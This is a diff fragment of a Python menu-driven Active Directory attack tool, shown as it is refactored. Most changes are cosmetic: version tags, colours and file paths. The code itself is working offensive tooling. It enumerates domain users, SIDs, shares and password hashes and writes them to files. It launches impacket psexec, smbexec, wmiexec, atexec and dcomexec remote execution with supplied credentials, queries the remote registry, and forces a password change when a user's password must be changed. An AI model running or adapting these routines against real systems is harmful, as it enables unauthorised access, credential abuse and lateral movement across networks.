+# Version : @g3nT_0r@nG3                                                              
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
 while True: 
-   command("rm *.tmp")
-   linecache.clearcache()
-   linecache.checkcache(filename=None)
-   command("clear")
-   LTM = getTime(COL1)
-   display()
-   options()
-   selection=input("[*] Select option: ")
+   command("rm *.tmp")							# CLEAR UP FILES
+   linecache.clearcache()						# CLEAR STORED CACHE
+   checkParams = 0							# RESET TEST PARAM
+   command("clear")							# REFRESH SCREEN
+   LTM = getTime(COL1)							# GET TIME VALUE
+   display()								# DISPLAY UPPER
+   options()								# DISPLAY LOWER
+   selection=input("[*] Please select an option: ")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Autofill PORTS, DOMAIN, SID, SHARES, USERS etc.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='0':   
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -675,7 +622,7 @@ while True:
          errorCheck = linecache.getline("lsaquery.tmp", 1) 
                  
          if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
-            print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour4))
+            print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour1))
             checkParams = 1                       
 # -----
 # DOMAIN MANAGEMENT
@@ -694,7 +641,7 @@ while True:
                print("[-] Unable to enumerate domain name...")
             else:
                print("[+] Found domain...\n")
-               print(colored(DOM,colour2))                  
+               print(colored(DOM,colour7))                  
             
             if DOMC == 1:
                print("\n[*] Resetting current domain associated host...")
@@ -722,7 +669,7 @@ while True:
                print("[-] Unable to enumerate domain SID...")
             else:
                print("[+] Found SID...\n")
-               print(colored(SID,colour2) + "\n")         
+               print(colored(SID,colour7) + "\n")         
 # -----
 # SHARE MANAGEMENT
 # -----
@@ -739,9 +686,10 @@ while True:
             errorCheck = linecache.getline("shares.tmp", 1)
   
             if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
-               print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour4))
+               print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour1))
             else:
-               cleanShares()     
+               for x in range(0, maximum):
+                  SHAR[x] = " "*COL2
 # -----
 # FILE PREP
 # -----
@@ -761,7 +709,7 @@ while True:
                            null, SHAR[x] = SHAR[x].split(":")
                         except ValueError:
                            SHAR[x] = "Error..."
-                        print(colored(SHAR[x].rstrip("\n"),colour2))
+                        print(colored(SHAR[x].rstrip("\n"),colour7))
                         SHAR[x] = dotPadding(SHAR[x], COL2)
                      print("")                 
 # -----
@@ -780,12 +728,12 @@ while True:
             errorCheck = linecache.getline("domusers.tmp", 1)
 
             if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
-               print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour4))
+               print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour1))
             else:
-               cleanUsers()
-               cleanTokens()
-               command("rm usernames.txt")
-               command("rm hashes.txt")    
+               
+               
+               command("rm DATAFILES/usernames.txt")
+               command("rm DATAFILES/hashes.txt")    
 # -----
 # FILE PREP
 # -----
@@ -797,7 +745,7 @@ while True:
 # -----     
                if count2 != 0:
                   print ("[+] Found users...\n")
-                  with open("sdomusers.tmp", "r") as read, open("usernames.txt", "a") as write1, open("hashes.txt", "a") as write2:
+                  with open("sdomusers.tmp", "r") as read, open("DATAFILES/usernames.txt", "a") as write1, open("DATAFILES/hashes.txt", "a") as write2:
                      for x in range(0, count2):
                         line = read.readline()
                         try:
@@ -817,7 +765,7 @@ while True:
                            write1.write(USER[x].rstrip(" ") + "\n")
                            write2.write(HASH[x].rstrip(" ") + "\n")
                                                          
-                           print(colored(USER[x],colour2))
+                           print(colored(USER[x],colour7))
                else:
                   print("[-] Unable to enumerate domain users...")         
       prompt()
@@ -825,7 +773,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change remote DNS SERVER name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -861,7 +809,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change remote IP address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -907,16 +855,16 @@ while True:
 
             for binding in bindings:
                NetworkAddr = binding['aNetworkAddr']
-               print(colored("Address: " + NetworkAddr, colour2))
+               print(colored("Address: " + NetworkAddr, colour7))
          except:
-            print(colored("[!] WARNING!!! - Unable to enumerate network address, no route to host...", colour4))
+            print(colored("[!] WARNING!!! - Unable to enumerate network address, no route to host...", colour1))
                
          prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change the remote port ranges.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -935,7 +883,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change the web address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -952,7 +900,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change the current USER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -975,7 +923,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change the current USERS PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -992,7 +940,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change the current USERS HASH value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1009,7 +957,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change the remote DOMAIN name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1034,7 +982,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change the remote DOMAIN SID value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1051,7 +999,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1068,7 +1016,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Reset local TIME to match kerberos skew. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1087,7 +1035,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Change local working DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1117,7 +1065,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Ping localhost IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1133,7 +1081,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - fierce -dns DNS SERVER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1148,13 +1096,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '15':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
                
       if USR[:2] == "''":
          print("\n[-] Username has not been specified...")
@@ -1173,13 +1121,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '16':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
             print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
@@ -1191,20 +1139,20 @@ while True:
                print("[-] Unable to enumerate any port information, good luck!!...")
             else:
                print("[+] Found live ports...\n")
-               print(colored(PTS,colour2))
+               print(colored(PTS,colour7))
         
       prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Intense quick TCP scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '17':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
   
       if checkParams != 1:
          if POR[:5] != "EMPTY":
@@ -1218,13 +1166,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '18':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          command("nmap " + IP46 + " --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
@@ -1233,13 +1181,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - nmap IP46 -sU -O -p 123 --script ntp-info IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '19':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
 
       if checkParams != 1:
 #         command("nmap " + IP46 + " -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
@@ -1249,14 +1197,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - getArch.py target IP
 # Details : 32/64 bit
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '20':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
 
       if checkParams != 1:
          print("[*] Attempting to enumerate architecture...")
@@ -1268,19 +1216,19 @@ while True:
                   print("[+] Found architecture...")
                   OS = line
          read.close()
-         print(colored(OS,colour2))
+         print(colored(OS,colour7))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='21':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          command(keypath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
@@ -1289,13 +1237,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - services.py USER:PASSWOrd@IP list.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='22':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          command(keypath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
@@ -1304,13 +1252,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '23':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          command(keypath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " whoami /all")
@@ -1319,13 +1267,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '24':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
          
       if checkParams != 1:
          command(keypath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
@@ -1334,13 +1282,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP service command.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
          
       if checkParams != 1:
             command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
@@ -1349,13 +1297,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '26':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if checkParams != 1:
          command(keypath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
@@ -1364,13 +1312,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '27':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          command(keypath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
@@ -1379,13 +1327,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - ifmap.py IP 135.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '28':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       if checkParams != 1:
          command(keypath + "ifmap.py " + TIP.rstrip(" ") + " 135")
       prompt()
@@ -1393,13 +1341,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '29':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          ifmap = input("[*] Please enter MSRPC interface (ifmap) : ")    
@@ -1412,16 +1360,16 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -U-GUC --da --full.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='30':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if IP46 == "-6":
-         print(colored("[!] WARNING!! Not comptable with IP 6...", colour4))
+         print(colored("[!] WARNING!! Not comptable with IP 6...", colour1))
 
       if checkParams != 1:
       
@@ -1449,20 +1397,20 @@ while True:
          print("\n[*] Enumerating AD computers...")
          command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
          
-#         command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt")         
+#        command(keypath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt")         
          
-      prompt() #  
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='31':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          print("[*] Enumerating, please wait....")
@@ -1517,7 +1465,7 @@ while True:
             print("[-] Unable to find usernames...")
          
          if os.path.getsize("users.tmp") != 0:
-            command("rm usernames.txt")				# PURGE OLD FILE
+            command("rm DATAFILES/usernames.txt")				# PURGE OLD FILE
          
             with open("users.tmp", "r") as read:
                for x in range(0, maximum):
@@ -1528,7 +1476,7 @@ while True:
                      except ValueError:
                         USER[x] = "Error..."
                      USER[x] = spacePadding(USER[x], COL3)
-                     command("echo " + USER[x] + " >> usernames.txt")
+                     command("echo " + USER[x] + " >> DATAFILES/usernames.txt")
                   else:
                      USER[x] = " "*COL3
             read.close()      
@@ -1537,13 +1485,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          print("[*] Enumerating users, please wait this can take sometime...")
@@ -1571,17 +1519,16 @@ while True:
          read.close()
         
          if checkParams != 1:
-            command("rm usernames.txt")          
-            command("rm hashes.txt")                        
-            command("touch hashes.txt")
-            cleanUsers()
+            command("rm DATAFILES/usernames.txt")          
+            command("rm DATAFILES/hashes.txt")                        
+            command("touch DATAFILES/hashes.txt")
+            
             
             command("rm tokens.txt")
-            command("touch tokens.txt")
-            cleanTokens()
-                    
-            command("sed -i -n '/Found user: /p' users.tmp")		# SELECT ONLY FOUND USERS
-            command("cat users.tmp | sort > users2.tmp")		# SORT USERS ALPHANUMERICALLY 
+            command("touch tokens.txt")      
+                          
+            command("sed -i -n '/Found user: /p' users.tmp")
+            command("cat users.tmp | sort > users2.tmp")
 
             with open("users2.tmp", "r") as read:
                for x in range (0, maximum):
@@ -1594,12 +1541,12 @@ while True:
                      USER[x] = spacePadding(USER[x], COL3)
                      
                      if USER[x] != "":
-                       print(colored(USER[x],colour2))
-                       command("echo " + USER[x] + " >> usernames.txt")		# ASSIGN USERS NAME
-                       HASH[x] = "."*COL4					# RESET PASSWORDS
+                       print(colored(USER[x],colour7))
+                       command("echo " + USER[x] + " >> DATAFILES/usernames.txt")
+                       HASH[x] = "."*COL4
                      else:
-                        USER[x] = " "*COL3					# ASSIGN EMPTY USERS
-                        HASH[x] = "."*COL4					# RESET PASSWORDS
+                        USER[x] = " "*COL3
+                        HASH[x] = "."*COL4
                   else:
                      USER[x] = " "*COL3
                      HASH[x] = " "*COL4   
@@ -1611,14 +1558,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
 # Details : #HKEY_LOCAL_MACHINE\SAM
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='33':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          command(keypath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
@@ -1627,13 +1574,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='34':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          command(keypath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
@@ -1642,13 +1589,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '35':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if checkParams != 1:
          if NTM[:5] == "EMPTY":
@@ -1661,13 +1608,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
 # Modified: N/A
+# Status  : Streamlined
 # -------------------------------------------------------------------------------------
 
    if selection =='36':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
          
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -1676,54 +1624,46 @@ while True:
          else:
             command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' > shares.tmp")
             
-         if os.path.getsize("shares.tmp") != 0:
-            command("rm shares.txt")
+         bonusCheck = linecache.getline("shares.tmp", 1)
          
+         if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
+            print(colored("[!] Bonus!! It looks like we can change this users password...", colour1))
+            command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
+            
+         if os.path.getsize("shares.tmp") != 0:       
             command("tput setaf 2")
             command("cat shares.tmp")
             command("tput sgr0")
             
-            command("sed -i /'is an IPv6 address'/d shares.tmp")	# TIDY UP THE FILE READY FOR READING
+            command("sed -i /'is an IPv6 address'/d shares.tmp")
             command("sed -i /'no workgroup'/d shares.tmp")
             command("sed -i /Sharename/d shares.tmp")
             command("sed -i /---------/d shares.tmp")
             command("sed -i '/^$/d' shares.tmp")
-      
-            cleanShares()						# PURGE CURRENT SHARE VALUES STORED IN MEMORY
-            count = len(open('shares.tmp').readlines()) 
+            command("sed -i 's/^[ \t]*//' shares.tmp")
+            command("mv shares.tmp DATAFILES/shares.txt")
          
-            with open("shares.tmp", "r") as read:
-               for x in range(0, count):
-                  line = read.readline().rstrip("\n")
-
-                  if line != "":
-                     SHAR[x] = line.lstrip()
-                     SHAR[x] = spacePadding(SHAR[x], COL2)		# REPOPULATE SHARE
-            
-                  if x == 0:
-                     if SHAR[0] == "session setup failed: NT_STATUS_PASSWORD_MUS":
-                        print(colored("[!] Bonus!! It looks like we can change this paricular users password...", colour4))
-                        command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
-                        print("[+] Password has been reset for this user...")
-               read.close()
-               command("mv shares.tmp shares.txt")
-         else:
-            print("[-] Unable to obtains shares...")
+         with open("DATAFILES/shares.txt", "r") as shares:
+            for x in range(0, maximum):
+                SHAR[x] = shares.readline().rstrip(" ")
+                SHAR[x] = spacePadding(SHAR[x], COL2)
+      else:
+         print("[-] Unable to obtains shares...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '37':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if IP46 == "-6":
-         print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour4))
+         print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour1))
          checkParams = 1
                  
       if checkParams != 1:
@@ -1755,39 +1695,42 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
